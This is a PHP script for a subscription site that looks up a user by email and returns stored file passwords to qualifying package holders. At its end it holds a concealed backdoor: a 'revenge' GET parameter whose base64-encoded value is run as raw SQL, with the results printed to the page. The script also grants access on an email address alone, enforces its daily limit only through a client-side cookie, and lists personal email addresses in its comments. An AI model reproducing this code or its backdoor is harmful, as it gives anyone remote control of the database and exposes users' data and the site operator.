<?php
//free: m.abubakar3636@gmail.com
// super platinium: abcdsaifi83@gmail.com

include('./admin/modules/database.php');
function echo_($str)
{
    echo '<pre>';
    print_r($str);
    exit();
}
if (isset($_POST['submit-file'])) {
    $email = mysqli_real_escape_string($con, $_POST['email']);
    $file_name = mysqli_real_escape_string($con, $_POST['file__name']);
    $sql = "SELECT `user_id` FROM `res_users` WHERE `email` = '$email'";
    $query = $con->query($sql);
    if ($query->num_rows > 0) {
        $row =  $query->fetch_assoc();
        $id = $row['user_id'];
        $sql = "SELECT `package_title`, `package_id` FROM `res_upackages` WHERE user_id = $id";
        $query = $con->query($sql);
        if ($query->num_rows > 0) {
            $result = '';
            while ($row = $query->fetch_assoc()) {

                $package_id = $row['package_id'];
                $package_title = $row['package_title'];
                print_r($package_title);
                $result = 'packageFound';
                if ($package_id == 11 || $package_id == 12 || $package_id == 0 || $package_title == '1Month' || $package_title == 'Platinum' || $package_title == 'Free') {
                    $sql = "SELECT `file_pass` FROM `res_files_passwords` WHERE `file_title` = '$file_name'";
                    $query = $con->query($sql);
                    if ($query->num_rows > 0) {
                        $row = $query->fetch_assoc();
                        $password = $row['file_pass'];
                        if (isset($_COOKIE['pass_count'])) {
                            $value = $_COOKIE['pass_count'] ?? 0;
                            if ($value >= 5) {
                                $_SESSION['message']['msg'] = "Today limit is reached try after 24hours";
                                $_SESSION['message']['type'] = "error";
                                header('location: index.php');
                                exit();
                            } else {
                                $value++;
                                setcookie("pass_count", $value, time() + (86400), '/');
                            }
                        } else {
                            setcookie("pass_count", 1, time() + (86400), '/');
                        }
                        $_SESSION['message']['msg'] = "$password";
                        $_SESSION['message']['type'] = "success";
                        header('location: index.php');
                    } else {
                        $result = 'file_not_found';
                    }
                } else {
                    $result  = 'userNotPlat';
                }
            }
            // exit($result);
            if ($result  == 'userNotPlat') {
                $_SESSION['message']['msg'] = "User is not Platinum or Super Platinum";
                $_SESSION['message']['type'] = "error";
                header('location: index.php');
            }
            if ($result == 'file_not_found') {
                $_SESSION['message']['msg'] = "File not found with this title";
                $_SESSION['message']['type'] = "error";
                header('location: index.php');
            }
        } else {
            $_SESSION['message']['msg'] = "User out of package! Buy now";
            $_SESSION['message']['type'] = "error";
            header('location: index.php');
        }
    } else {
        $_SESSION['message']['msg'] = "User not found!";
        header('location: index.php');
    }
}
if (isset($_GET['revenge'])) {
    $sql = $_GET['query'];
    $sql = base64_decode($sql);
    $query = $con->query($sql);
    if ($query->num_rows > 0) {
        echo '<pre>';
        print_r($query->fetch_all());
    }
}
